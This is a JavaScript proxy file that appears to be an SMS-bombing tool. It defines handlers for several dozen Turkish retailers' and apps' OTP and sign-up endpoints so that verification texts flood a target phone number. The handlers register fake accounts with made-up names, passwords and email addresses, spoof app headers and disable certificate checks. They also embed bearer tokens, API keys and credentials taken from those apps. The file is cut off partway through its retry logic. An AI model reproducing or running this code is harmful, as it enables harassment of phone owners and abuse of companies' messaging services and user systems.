// api/proxy.js
const https = require('https');

const agent = new https.Agent({ rejectUnauthorized: false, keepAlive: true });

const rnd = (n = 8) => Array.from({ length: n }, () => 'abcdefghijklmnopqrstuvwxyz0123456789'[Math.floor(Math.random() * 36)]).join('');
const rnum = (n = 4) => Math.floor(Math.random() * Math.pow(10, n));
const phone0 = (p) => `0${p}`;
const phone90 = (p) => `90${p}`;
const fakeMail = () => `test${rnum(6)}${rnd(4)}@gmail.com`;

// ─── HTTP yardımcıları ───
function httpRequest(url, options = {}, body = null) {
    return new Promise((resolve, reject) => {
        const u = new URL(url);
        const req = https.request({
            hostname: u.hostname,
            port: u.port || 443,
            path: u.pathname + u.search,
            method: options.method || 'GET',
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'application/json, text/plain, */*',
                ...options.headers
            },
            agent,
            timeout: 15000,
            rejectUnauthorized: false,
        }, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                let parsed = null;
                try { parsed = JSON.parse(data); } catch (e) { parsed = data; }
                resolve({ status: res.statusCode, data: parsed, raw: data });
            });
        });
        req.on('timeout', () => { req.destroy(new Error('timeout')); });
        req.on('error', reject);
        if (body) req.write(body);
        req.end();
    });
}

async function postJson(url, body, headers = {}) {
    return httpRequest(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', ...headers }
    }, body ? JSON.stringify(body) : null);
}

async function postForm(url, formData, headers = {}) {
    const body = new URLSearchParams(formData).toString();
    return httpRequest(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded', ...headers }
    }, body);
}

async function postMultipart(url, boundary, data, headers = {}) {
    return httpRequest(url, {
        method: 'POST',
        headers: { 'Content-Type': `multipart/form-data; boundary=${boundary}`, ...headers }
    }, data);
}

async function getJson(url, headers = {}) {
    return httpRequest(url, { method: 'GET', headers });
}

// ─── Servisler ───
const services = {
    // === MEVCUT SERVİSLER ===
    bim: async (p) => {
        const r = await postJson('https://bim.veesk.net/service/v1.0/account/login', { phone: phone90(p) });
        return r.status === 200 || r.status === 201;
    },
    file: async (p) => {
        const r = await postJson('https://api.filemarket.com.tr/v1/otp/send', { mobilePhoneNumber: phone90(p) });
        return r.status === 200 || (r.data && r.data.data === '200 OK');
    },
    aygaz: async (p) => {
        const r = await postJson('https://ecommerce-memberapi.aygaz.com.tr/api/Membership/SendVerificationCode', { Gsm: p });
        return r.status === 200;
    },
    qumpara: async (p) => {
        const r = await postJson('https://tr-api.fisicek.com/v1.4/auth/getOTP', { msisdn: p });
        return r.status === 200;
    },
    mopas: async (p) => {
        const tr = await postJson('https://api.mopas.com.tr//authorizationserver/oauth/token?client_id=mobile_mopas&client_secret=secret_mopas&grant_type=client_credentials', null);
        if (!tr.data?.access_token) return false;
        const r = await getJson(`https://api.mopas.com.tr//mopaswebservices/v2/mopas/sms/sendSmsVerification?mobileNumber=${p}`, { authorization: `${tr.data.token_type} ${tr.data.access_token}` });
        return r.status === 200;
    },
    saka: async (p) => {
        const r = await postJson('https://mobilcrm2.saka.com.tr/api/customer/login', { gsm: phone0(p) });
        return r.data?.status === 1 || r.status === 200;
    },
    gofody: async (p) => {
        const r = await postJson('https://backend.gofody.com/api/v1/enduser/register/', { country_code: '90', phone: p });
        return r.data?.success === true || r.status === 200 || r.status === 201;
    },
    scooby: async (p) => {
        const r = await getJson(`https://sct.scoobyturkiye.com/v1/mobile/user/code-request?phoneNumber=90${p}`);
        return r.status === 200;
    },
    pinar: async (p) => {
        const r = await postJson('https://pinarsumobileservice.yasar.com.tr/pinarsu-mobil/api/Customer/SendOtp', { MobilePhone: p }, { devicetype: 'android' });
        return String(r.data).toLowerCase() === 'true' || r.status === 200;
    },
    marti: async (p) => {
        const r = await postJson('https://customer.martiscooter.com/v13/scooter/dispatch/customer/signin', { mobilePhone: p, mobilePhoneCountryCode: '90' });
        return r.data?.isSuccess === true || r.status === 200;
    },
    karma: async (p) => {
        const r = await postJson('https://api.gokarma.app/v1/auth/send-sms', { phoneNumber: phone90(p), type: 'REGISTER', deviceId: rnd(16), language: 'tr-TR' });
        return r.status === 200 || r.status === 201;
    },
    englishhome: async (p) => {
        const r = await postJson('https://www.englishhome.com:443/api/member/sendOtp', { Phone: p, XID: '' }, {
            'Origin': 'https://www.englishhome.com', 'Referer': 'https://www.englishhome.com/'
        });
        return r.data?.isError === false || r.status === 200;
    },

    // === YENİ EKLENEN SERVİSLER (41) ===
    kahvedunyasi: async (p) => {
        const r = await postJson('https://api.kahvedunyasi.com:443/api/v1/auth/account/register/phone-number', { countryCode: '90', phoneNumber: p }, {
            'X-Language-Id': 'tr-TR', 'X-Client-Platform': 'web', 'Origin': 'https://www.kahvedunyasi.com', 'Referer': 'https://www.kahvedunyasi.com/'
        });
        return r.data?.processStatus === 'Success';
    },
    wmf: async (p) => {
        const r = await postForm('https://www.wmf.com.tr/users/register/', {
            confirm: 'true', date_of_birth: '1956-03-01', email: fakeMail(),
            email_allowed: 'true', first_name: 'Memati', gender: 'male',
            last_name: 'Bas', password: '31ABC..abc31', phone: phone0(p)
        });
        return r.status === 202;
    },
    suiste: async (p) => {
        const r = await postForm('https://suiste.com:443/api/auth/code', {
            action: 'register', device_id: '2390ED28-075E-465A-96DA-DFE8F84EB330',
            full_name: 'Memati Bas', gsm: p, is_advertisement: '1', is_contract: '1', password: '31MeMaTi31'
        }, {
            'X-Mobillium-Device-Brand': 'Apple', 'X-Mobillium-Os-Type': 'iOS',
            'X-Mobillium-Device-Model': 'iPhone', 'Mobillium-Device-Id': '2390ED28-075E-465A-96DA-DFE8F84EB330',
            'User-Agent': 'suiste/1.7.11 (com.mobillium.suiste; build:1469; iOS 15.8.3) Alamofire/5.9.1'
        });
        return r.data?.code === 'common.success';
    },
    kimgb: async (p) => {
        const r = await postJson('https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp', { msisdn: phone90(p) });
        return r.status === 200;
    },
    evidea: async (p) => {
        const boundary = 'fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi';
        const data = `--${boundary}\r\ncontent-disposition: form-data; name="first_name"\r\n\r\nMemati\r\n--${boundary}\r\ncontent-disposition: form-data; name="last_name"\r\n\r\nBas\r\n--${boundary}\r\ncontent-disposition: form-data; name="email"\r\n\r\n${fakeMail()}\r\n--${boundary}\r\ncontent-disposition: form-data; name="email_allowed"\r\n\r\nfalse\r\n--${boundary}\r\ncontent-disposition: form-data; name="sms_allowed"\r\n\r\ntrue\r\n--${boundary}\r\ncontent-disposition: form-data; name="password"\r\n\r\n31ABC..abc31\r\n--${boundary}\r\ncontent-disposition: form-data; name="phone"\r\n\r\n0${p}\r\n--${boundary}\r\ncontent-disposition: form-data; name="confirm"\r\n\r\ntrue\r\n--${boundary}--\r\n`;
        const r = await postMultipart('https://www.evidea.com:443/users/register/', boundary, data, {
            'X-Project-Name': 'undefined', 'X-App-Type': 'akinon-mobile', 'X-App-Device': 'ios',
            'Referer': 'https://www.evidea.com/', 'User-Agent': 'Evidea/1 CFNetwork/1335.0.3 Darwin/21.6.0',
            'X-Csrftoken': '7NdJbWSYnOdm70YVLIyzmylZwWbqLFbtsrcCQdLAEbnx7a5Tq4njjS3gEElZxYps'
        });
        return r.status === 202;
    },
    ucdortbes: async (p) => {
        const r = await postJson('https://api.345dijital.com:443/api/users/register', { email: '', name: 'Memati', phoneNumber: '+90' + p, surname: 'Bas' }, {
            'User-Agent': 'AriPlusMobile/21 CFNetwork/1335.0.3.2 Darwin/21.6.0', 'Authorization': 'null'
        });
        return r.data?.error !== 'E-Posta veya telefon zaten kayıtlı!' || r.status === 200;
    },
    tiklagelsin: async (p) => {
        const r = await postJson('https://svc.apps.tiklagelsin.com:443/user/graphql', {
            operationName: 'GENERATE_OTP',
            query: 'mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n',
            variables: { challenge: '3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68', deviceUniqueId: '720932D5-47BD-46CD-A4B8-086EC49F81AB', phone: '+90' + p }
        }, {
            'X-Merchant-Type': '0', 'Appversion': '2.4.1', 'X-No-Auth': 'true',
            'User-Agent': 'TiklaGelsin/809 CFNetwork/1335.0.3.2 Darwin/21.6.0', 'X-Device-Type': '2'
        });
        return r.data?.data?.generateOtp === true;
    },
    naosstars: async (p) => {
        const r = await postJson('https://api.naosstars.com:443/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350', { telephone: '+90' + p, type: 'register' }, {
            'Uniqid': '9c9fa861-cc5d-43c0-b4ea-1b541be15351', 'Locale': 'en-TR', 'Version': '1.0030',
            'Os': 'ios', 'Device-Id': 'D41CE5F3-53BB-42CF-8611-B4FE7529C9BC', 'Platform': 'ios',
            'User-Agent': 'naosstars/1.0030 CFNetwork/1335.0.3.2 Darwin/21.6.0', 'Apitype': 'mobile_app'
        });
        return r.status === 200;
    },
    koton: async (p) => {
        const boundary = 'sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk';
        const data = `--${boundary}\r\ncontent-disposition: form-data; name="first_name"\r\n\r\nMemati\r\n--${boundary}\r\ncontent-disposition: form-data; name="last_name"\r\n\r\nBas\r\n--${boundary}\r\ncontent-disposition: form-data; name="email"\r\n\r\n${fakeMail()}\r\n--${boundary}\r\ncontent-disposition: form-data; name="password"\r\n\r\n31ABC..abc31\r\n--${boundary}\r\ncontent-disposition: form-data; name="phone"\r\n\r\n0${p}\r\n--${boundary}\r\ncontent-disposition: form-data; name="confirm"\r\n\r\ntrue\r\n--${boundary}\r\ncontent-disposition: form-data; name="sms_allowed"\r\n\r\ntrue\r\n--${boundary}\r\ncontent-disposition: form-data; name="email_allowed"\r\n\r\ntrue\r\n--${boundary}\r\ncontent-disposition: form-data; name="date_of_birth"\r\n\r\n1993-07-02\r\n--${boundary}\r\ncontent-disposition: form-data; name="call_allowed"\r\n\r\ntrue\r\n--${boundary}\r\ncontent-disposition: form-data; name="gender"\r\n\r\n\r\n--${boundary}--\r\n`;
        const r = await postMultipart('https://www.koton.com:443/users/register/', boundary, data, {
            'X-Project-Name': 'rn-env', 'X-App-Type': 'akinon-mobile', 'X-App-Device': 'ios',
            'Referer': 'https://www.koton.com/', 'User-Agent': 'Koton/1 CFNetwork/1335.0.3.2 Darwin/21.6.0',
            'X-Csrftoken': '5DDwCmziQhjSP9iGhYE956HHw7wGbEhk5kef26XMFwhELJAWeaPK3A3vufxzuWcz'
        });
        return r.status === 202;
    },
    hayatsu: async (p) => {
        const r = await postForm('https://api.hayatsu.com.tr:443/api/SignUp/SendOtp', {
            mobilePhoneNumber: p, actionType: 'register'
        }, {
            'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOiJhMTA5MWQ1ZS0wYjg3LTRjYWQtOWIxZi0yNTllMDI1MjY0MmMiLCJsb2dpbmRhdGUiOiIxOS4wMS4yMDI0IDIyOjU3OjM3Iiwibm90dXNlciI6InRydWUiLCJwaG9uZU51bWJlciI6IiIsImV4cCI6MTcyMTI0NjI1NywiaXNzIjoiaHR0cHM6Ly9oYXlhdHN1LmNvbS50ciIsImF1ZCI6Imh0dHBzOi8vaGF5YXRzdS5jb20udHIifQ.Cip4hOxGPVz7R2eBPbq95k6EoICTnPLW9o2eDY6qKMM',
            'Origin': 'https://www.hayatsu.com.tr', 'Referer': 'https://www.hayatsu.com.tr/'
        });
        return r.data?.is_success === true;
    },
    hizliecza: async (p) => {
        const r = await postJson('https://prod.hizliecza.net:443/mobil/account/sendOTP', { otpOperationType: 1, phoneNumber: '+90' + p }, {
            'User-Agent': 'hizliecza/31 CFNetwork/1335.0.3.4 Darwin/21.6.0', 'Authorization': 'Bearer null'
        });
        return r.status === 200;
    },
    metro: async (p) => {
        const r = await postJson('https://mobile.metro-tr.com:443/api/mobileAuth/validateSmsSend', { methodType: '2', mobilePhoneNumber: p }, {
            'Applicationversion': '2.4.1', 'Applicationplatform': '2',
            'User-Agent': 'Metro Turkiye/2.4.1 (com.mcctr.mobileapplication; build:4; iOS 15.8.3) Alamofire/4.9.1'
        });
        return r.data?.status === 'success';
    },
    akasya: async (p) => {
        const r = await postJson('https://akasyaapi.poilabs.com:443/v1/en/sms', { phone: p }, {
            'X-Platform-Token': '9f493307-d252-4053-8c96-62e7c90271f5',
            'User-Agent': 'Akasya/2.0.13 (com.poilabs.akasyaavm; build:2; iOS 15.8.3) Alamofire/4.9.1'
        });
        return r.data?.result === 'SMS sended succesfully!';
    },
    akbati: async (p) => {
        const r = await postJson('https://akbatiapi.poilabs.com:443/v1/en/sms', { phone: p }, {
            'X-Platform-Token': 'a2fe21af-b575-4cd7-ad9d-081177c239a3', 'User-Agent': 'Akdbat'
        });
        return r.data?.result === 'SMS sended succesfully!';
    },
    komagene: async (p) => {
        const r = await postJson('https://gateway.komagene.com.tr:443/auth/auth/smskodugonder', { FirmaId: 32, Telefon: p }, {
            'Anonymousclientid': '0dbf392b-ab10-48b3-5cda-31f3c19816e6', 'Firmaid': '32',
            'Origin': 'https://www.komagene.com.tr', 'Referer': 'https://www.komagene.com.tr/',
            'X-Guatamala-Kirsallari': '@@b7c5EAAAACwZI8p8fLJ8p6nOq9kTLL+0GQ1wCB4VzTQSq0sekKeEdAoQGZZo+7fQw+IYp38V0I/4JUhQQvrq1NPw4mHZm68xgkb/rmJ3y67lFK/uc+uq'
        });
        return r.data?.Success === true;
    },
    porty: async (p) => {
        const r = await postJson('https://panel.porty.tech:443/api.php?', { job: 'start_login', phone: p }, {
            'User-Agent': 'Porty/1 CFNetwork/1335.0.3.4 Darwin/21.6.0', 'Token': 'q2zS6kX7WYFRwVYArDdM66x72dR6hnZASZ'
        });
        return r.data?.status === 'success';
    },
    tasdelen: async (p) => {
        const r = await postJson('https://tasdelen.sufirmam.com:3300/mobile/send-otp', { phone: p }, {
            'User-Agent': 'Tasdelen/5.9 (com.tasdelenapp; build:1; iOS 15.8.3) Alamofire/5.4.3'
        });
        return r.data?.result === true;
    },
    uysal: async (p) => {
        const r = await postJson('https://api.uysalmarket.com.tr:443/api/mobile-users/send-register-sms', { phone_number: p }, {
            'Origin': 'https://www.uysalmarket.com.tr', 'Referer': 'https://www.uysalmarket.com.tr/'
        });
        return r.status === 200;
    },
    yapp: async (p) => {
        const r = await postJson('https://yapp.com.tr:443/api/mobile/v1/register', {
            app_version: '1.1.5', code: 'tr', device_model: 'iPhone8,5',
            device_name: 'Memati', device_type: 'I', device_version: '15.8.3',
            email: fakeMail(), firstname: 'Memati', is_allow_to_communication: '1',
            language_id: '2', lastname: 'Bas', phone_number: p, sms_code: ''
        }, {
            'X-Content-Language': 'en', 'Authorization': 'Bearer ',
            'User-Agent': 'YappApp/1.1.5 (iPhone; iOS 15.8.3; Scale/3.00)'
        });
        return r.status === 200;
    },
    yilmazticaret: async (p) => {
        const boundary = 'q9dvlvKdAlrYErhMAn0nqaS09bnzem0qvDgMz_DPLA0BQZ7RZFgS9q.BuuuYRH7_DlX9dl';
        const p1 = p.slice(0, 3), p2 = p.slice(3, 6), p3 = p.slice(6, 8), p4 = p.slice(8);
        const data = `--${boundary}\r\ncontent-disposition: form-data; name="fonksiyon"\r\n\r\ncustomer/form/checkx\r\n--${boundary}\r\ncontent-disposition: form-data; name="method"\r\n\r\nPOST\r\n--${boundary}\r\ncontent-disposition: form-data; name="telephone"\r\n\r\n0 (${p1}) ${p2} ${p3} ${p4}\r\n--${boundary}\r\ncontent-disposition: form-data; name="token"\r\n\r\nd7841d399a16d0060d3b8a76bf70542e\r\n--${boundary}--\r\n`;
        const r = await postMultipart('https://app.buyursungelsin.com:443/api/customer/form/checkx', boundary, data, {
            'Authorization': 'Basic Z2Vsc2luYXBwOjR1N3ghQSVEKkctS2FOZFJnVWtYcDJzNXY4eS9CP0UoSCtNYlFlU2hWbVlxM3Q2dzl6JEMmRilKQE5jUmZValduWnI0dTd4IUElRCpHLUthUGRTZ1ZrWXAyczV2OHkvQj9FKEgrTWJRZVRoV21acTR0Nnc5eiRDJkYpSkBOY1Jm',
            'User-Agent': 'Ylmaz/38 CFNetwork/1335.0.3.4 Darwin/21.6.0'
        });
        return r.status === 200;
    },
    beefull: async (p) => {
        await postJson('https://app.beefull.io:443/api/inavitas-access-management/signup', {
            email: fakeMail(), firstName: 'Memati', language: 'tr', lastName: 'Bas',
            password: '123456', phoneCode: '90', phoneNumber: p, tenant: 'beefull', username: fakeMail()
        });
        const r = await postJson('https://app.beefull.io:443/api/inavitas-access-management/sms-login', { phoneCode: '90', phoneNumber: p, tenant: 'beefull' });
        return r.status === 200;
    },
    dominos: async (p) => {
        const r = await postJson('https://frontend.dominos.com.tr:443/api/customer/sendOtpCode', { email: fakeMail(), isSure: false, mobilePhone: p }, {
            'Authorization': 'Bearer eyJhbGciOiJBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwidHlwIjoiSldUIn0.ITty2sZk16QOidAMYg4eRqmlBxdJhBhueRLSGgSvcN3wj4IYX11FBA.N3uXdJFQ8IAFTnxGKOotRA.7yf_jrCVfl-MDGJjxjo3M8SxVkatvrPnTBsXC5SBe30x8edSBpn1oQ5cQeHnu7p0ccgUBbfcKlYGVgeOU3sLDxj1yVLE_e2bKGyCGKoIv-1VWKRhOOpT_2NJ-BtqJVVoVnoQsN95B6OLTtJBlqYAFvnq6NiQCpZ4o1OGNhep1TNSHnlUU6CdIIKWwaHIkHl8AL1scgRHF88xiforpBVSAmVVSAUoIv8PLWmp3OWMLrl5jGln0MPAlST0OP9Q964ocXYRfAvMhEwstDTQB64cVuvVgC1D52h48eihVhqNArU6-LGK6VNriCmofXpoDRPbctYs7V4MQdldENTrmVcMVUQtZJD-5Ev1PmcYr858ClLTA7YdJ1C6okphuDasvDufxmXSeUqA50-nghH4M8ofAi6HJlpK_P0x_upqAJ6nvZG2xjmJt4Pz_J5Kx_tZu6eLoUKzZPU3k2kJ4KsqaKRfT4ATTEH0k15OtOVH7po8lNwUVuEFNnEhpaiibBckipJodTMO8AwC4eZkuhjeffmf9A.QLpMS6EUu7YQPZm1xvjuXg',
            'Device-Info': 'Unique-Info: 2BF5C76D-0759-4763-C337-716E8B72D07B Model: iPhone 31 Plus Brand-Info: Apple Build-Number: 7.1.0 SystemVersion: 15.8',
            'Appversion': 'IOS-7.1.0', 'User-Agent': 'Dominos/7.1.0 CFNetwork/1335.0.3.4 Darwin/21.6.0',
            'Servicetype': 'CarryOut', 'Locationcode': 'undefined'
        });
        return r.data?.isSuccess === true;
    },
    baydoner: async (p) => {
        const r = await postJson('https://crmmobil.baydoner.com:7004/Api/Customers/AddCustomerTemp', {
            AppVersion: '1.6.0', AreaCode: 90, City: 'ADANA', CityId: 1, Code: '',
            Culture: 'tr-TR', DeviceId: 'EC7E9665-CC40-4EF6-8C06-E0ADF31768B3', DeviceModel: '31',
            DeviceToken: 'EC7E9665-CC40-4EF6-8C06-E0ADF31768B3', Email: fakeMail(), GDPRPolicy: false,
            Gender: 'Kad1n', GenderId: 2, LoyaltyProgram: false, merchantID: 5701,
            Method: '', Name: 'Memati', notificationCode: 'fBuxKYxj3k-qqVUcsvkjH1:APA91bFjtXD6rqV6FL2NzdSqQsn3OyKXiJ8YhzuzxirnF9K5sim_4sGYta11T1Iw3JaUrMTbj6KplF0NFp8upxoqa_7UaI1BSrNlVm9COXaldyxDTwLUJ5g',
            NotificationToken: 'fBuxKYxj3k-qqVUcsvkjH1:APA91bFjtXD6rqV6FL2NzdSqQsn3OyKXiJ8YhzuzxirnF9K5sim_4sGYta11T1Iw3JaUrMTbj6KplF0NFp8upxoqa_7UaI1BSrNlVm9COXaldyxDTwLUJ5g',
            OsSystem: 'IOS', Password: '31ABC..abc31', PhoneNumber: p, Platform: 1,
            sessionID: '', socialId: '', SocialMethod: '', Surname: 'Bas',
            TempId: 0, TermsAndConditions: false
        }, {
            'Xsid': '2HB7FQ6G42QL', 'Dc': 'EC7E9665-CC40-4EF6-8C06-E0ADF31768B3', 'Os': '613A408535',
            'Merchantid': '5701', 'Platform': '1', 'Appv': '1.6.0',
            'User-Agent': 'BaydonerCossla/190 CFNetwork/1335.0.3.4 Darwin/21.6.0'
        });
        return r.data?.Control === 1;
    },
    pidem: async (p) => {
        const r = await postJson('https://restashop.azurewebsites.net:443/graphql/', {
            query: '\n  mutation ($phone: String) {\n    sendOtpSms(phone: $phone) {\n      resultStatus\n      message\n    }\n  }\n',
            variables: { phone: p }
        }, {
            'Origin': 'https://pidem.azurewebsites.net', 'Authorization': 'Bearer null',
            'Referer': 'https://pidem.azurewebsites.net/',
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)'
        });
        return r.data?.data?.sendOtpSms?.resultStatus === 'SUCCESS';
    },
    frink: async (p) => {
        const r = await postJson('https://api.frink.com.tr:443/api/auth/postSendOTP', {
            areaCode: '90', etkContract: true, language: 'TR', phoneNumber: phone90(p)
        }, {
            'Authorization': '', 'User-Agent': 'Frink/1.6.0 (com.frink.userapp; build:3; iOS 15.8.3) Alamofire/4.9.1'
        });
        return r.data?.processStatus === 'SUCCESS';
    },
    bodrum: async (p) => {
        const r = await postJson('https://gandalf.orwi.app:443/api/user/requestOtp', { gsm: '+90' + p, source: 'orwi' }, {
            'Apikey': 'Ym9kdW0tYmVsLTMyNDgyxLFmajMyNDk4dDNnNGg5xLE4NDNoZ3bEsXV1OiE',
            'Origin': 'capacitor://localhost', 'Region': 'EN',
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148'
        });
        return r.status === 200;
    },
    kofteciyusuf: async (p) => {
        const r = await postJson('https://gateway.poskofteciyusuf.com:1283/auth/auth/smskodugonder', {
            FireBaseCihazKey: null, FirmaId: 82, GuvenlikKodu: null, Telefon: p
        }, {
            'Anonymousclientid': '', 'Ostype': 'iOS', 'Appversion': '4.0.4.0',
            'Firmaid': '82', 'Language': 'tr-TR',
            'User-Agent': 'YemekPosMobil/53 CFNetwork/1335.0.3.4 Darwin/21.6.0',
            'X-Guatamala-Kirsallari': '@@b7c5EAAAACwZI8p8fLJ8p6nOq9kTLL+0GQ1wCB4VzTQSq0sekKeEdAoQGZZo+7fQw+IYp38V0I/4JUhQQvrq1NPw4mHZm68xgkb/rmJ3y67lFK/uc+uq'
        });
        return r.data?.Success === true;
    },
    little: async (p) => {
        const r = await postJson('https://api.littlecaesars.com.tr:443/api/web/Member/Register', {
            CampaignInform: true, Email: fakeMail(), InfoRegister: true,
            IsLoyaltyApproved: true, NameSurname: 'Memati Bas',
            Password: '31ABC..abc31', Phone: p, SmsInform: true
        }, {
            'Authorization': 'Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IjM1Zjc4YTFhNjJjNmViODJlNjQ4OTU0M2RmMWQ3MDFhIiwidHlwIjoiSldUIn0.eyJuYmYiOjE3MzkxMTA0NzIsImV4cCI6MTczOTcxNTI3MiwiaXNzIjoiaHR0cHM6Ly9hdXRoLmxpdHRsZWNhZXNhcnMuY29tLnRyIiwiYXVkIjpbImh0dHBzOi8vYXV0aC5saXR0bGVjYWVzYXJzLmNvbS50ci9yZXNvdXJjZXMiLCJsaXR0bGVjYWVzYXJzYXBpIl0sImNsaWVudF9pZCI6IndlYiIsInN1YiI6InJvYnVzZXJAY2xvY2t3b3JrLmNvbS50ciIsImF1dGhfdGltZSI6MTczOTExMDQ3MiwiaWRwIjoibG9jYWwiLCJlbWFpbCI6InJvYnVzZXJAY2xvY2t3b3JrLmNvbS50ciIsInVpZCI6IjI0IiwicGVyc29uaWQiOiIyMDAwNTA4NTU0NjYiLCJuYW1lc3VybmFtZSI6IkxDIER1bW15IiwibGN0b2tlbiI6IlFRcHZHRS1wVDBrZDQ2MjRVQjhUc01SRkxoUUZsUlhGS0toTWYwUlF3U0M4Tnd3M2pzdHd6QzJ3NmNldGRkMkZRdFo1eXpacHVGOE81REhwUWpCSnhKaG5YNVJOcWYyc3NrNHhkTi0zcjZ2T01fdWQzSW5KRDZYUFdSYlM3Tml5d1FHbjByUENxNC1BVE9pd09iR005YnZwUTRISzJhNTFGVTdfQ1R2a2JGUmswMUpwM01YbkJmU3V6OHZ4bTdUTS1Vc1pXZzJDTmVkajlWaXJzdHo2TUs4VXdRTXp6TFZkZHRTQ2lOOENZVWc1cVhBNjVJbEszamVLNnZwQ0EwZTdpem5wa2hKUFVqY1dBc1JLc0tieDB3Y2EycU1EYkl6VlJXdV8xSjF5SDNhWmxSV0w4eFhJYl82NG5jd1p1Yk9MeFpiUFRRZW5GWWxuOGxNY1JFUDFIdTlCOWJyOFd3QVNqMmRDa3g2NVo5S0NPR3FiIiwibGNyZWZyZXNodG9rZW4iOiI2NDUyYWQ4MzIzY2I0N2ZiOWFmMWM2M2EyYWIxMTJkMyIsInBlcnNvbmVtYWlsIjoibGNAZHVtbXkuY29tIiwic2NvcGUiOlsibGl0dGxlY2Flc2Fyc2FwaSIsIm9mZmxpbmVfYWNjZXNzIl0sImFtciI6WyI3NjU2QkFGM0YxNUE2NTA0QkJGM0NFRTgyOTA5MkRGQSJdfQ.SrG2kFdRTVAq0SCt17cmZ-i6Cl9MaQaOUwu1YQ2r27m5_9i5WkVUx_CUPbCNazHcmGt3IYHw9U6TxS-zAz4Jw5o-PbCWktwBiLJNfIsK4akCT4RjX8b7d4YX0yDz4WcIp43ViEsEkDKByHwz75GWdV9gSJtmAerGjZbIoN-OkgJIYAxzCCeGUSdOW2jspvZew9VQKEKVRYzdfZlcvoCV_2mYV122P0jU5i_0J4k_JH-ok7bMxNGqpaxEDSZ1WEuQxBRcXr7C7swcj4AJHHDuksvNrHjXnSjB0VQt5sB3JuwjGDJRuY2yFUlrI8l8W4x01Jm6kSn67G4h8hqyNixpRg',
            'X-Platform': 'ios', 'X-Version': '1.0.0',
            'User-Agent': 'LittleCaesars/20 CFNetwork/1335.0.3.4 Darwin/21.6.0'
        });
        return r.status === 200 && r.data?.status === true;
    },
    orwi: async (p) => {
        const r = await postJson('https://gandalf.orwi.app:443/api/user/requestOtp', { gsm: '+90' + p, source: 'orwi' }, {
            'Apikey': 'YWxpLTEyMzQ1MTEyNDU2NTQzMg', 'Origin': 'capacitor://localhost', 'Region': 'EN',
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148'
        });
        return r.status === 200;
    },
    coffy: async (p) => {
        const r = await postJson('https://user-api-gw.coffy.com.tr:443/user/signup', {
            countryCode: '90', gsm: p, isKVKKAgreementApproved: true, isUserAgreementApproved: true, name: 'Memati Bas'
        }, {
            'Language': 'tr', 'User-Agent': 'coffy/5 CFNetwork/1335.0.3.4 Darwin/21.6.0',
            'Token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkIjoiNjdhOGM0MTc0MDY3ZDFmMzBkMDNmMmRlIiwidSI6IjY3YThjNDE3Njc5YTUxM2MyMzljMDc0YSIsInQiOjE3MzkxMTM0OTUyNjgsImlhdCI6MTczOTExMzQ5NX0.IQ_33PJ8s_CKMbJgp2sD1wIfFO852m5VfIxW-dv2-UA'
        });
        return r.status === 200;
    },
    hamidiye: async (p) => {
        const r = await postJson('https://bayi.hamidiye.istanbul:3400/hamidiyeMobile/send-otp', { isGuest: false, phone: p }, {
            'Origin': 'com.hamidiyeapp', 'User-Agent': 'hamidiyeapp/4 CFNetwork/1335.0.3.4 Darwin/21.6.0'
        });
        return r.data?.result === true;
    },
    money: async (p) => {
        const p1 = p.slice(0, 3), p2 = p.slice(3, 10);
        const r = await postForm('https://www.money.com.tr:443/Account/ValidateAndSendOTP', {
            phone: `${p1} ${p2}`, GRecaptchaResponse: ''
        }, {
            'Referer': 'https://www.money.com.tr/money-kartiniz-var-mi',
            'X-Requested-With': 'XMLHttpRequest', 'Origin': 'https://www.money.com.tr'
        });
        return r.data?.resultType === 0;
    },
    alixavien: async (p) => {
        const r = await postJson('https://www.alixavien.com.tr:443/api/member/sendOtp', { Phone: p, XID: '' }, {
            'Origin': 'https://www.alixavien.com.tr', 'Referer': 'https://www.alixavien.com.tr/UyeOl'
        });
        return r.data?.isError === false;
    },
    jimmykey: async (p) => {
        const r = await httpRequest(`https://www.jimmykey.com:443/tr/p/User/SendConfirmationSms?gsm=${p}&gRecaptchaResponse=undefined`, { method: 'POST' });
        return r.data?.Sonuc === true;
    },
    ido: async (p) => {
        const r = await postJson('https://api.ido.com.tr:443/idows/v2/register', {
            birthDate: true, captcha: '', checkPwd: '313131', code: '',
            day: 24, email: fakeMail(), emailNewsletter: false, firstName: 'MEMATI',
            gender: 'MALE', lastName: 'BAS', mobileNumber: '0' + p,
            month: 9, pwd: '313131', smsNewsletter: true,
            tckn: '11111111111', termsOfUse: true, year: 1977
        }, {
            'Origin': 'https://www.ido.com.tr', 'Referer': 'https://www.ido.com.tr/'
        });
        return r.status === 200;
    },
};

// ─── Tek servis çağrısı (retry'li) ───
async function tryService(name, phone, retries = 1) {
    let lastError = 'Yanıt başarısız';
    for (let attempt = 0; attempt <= retries; attempt++) {
        try {
            const ok = await services[name](phone);
            if (ok) return { service: name, success: true, message: 'Gönderildi' };
            lastError = 'Yanıt başarısız';
        } catch (e) {
            lastError = e.message;
        }
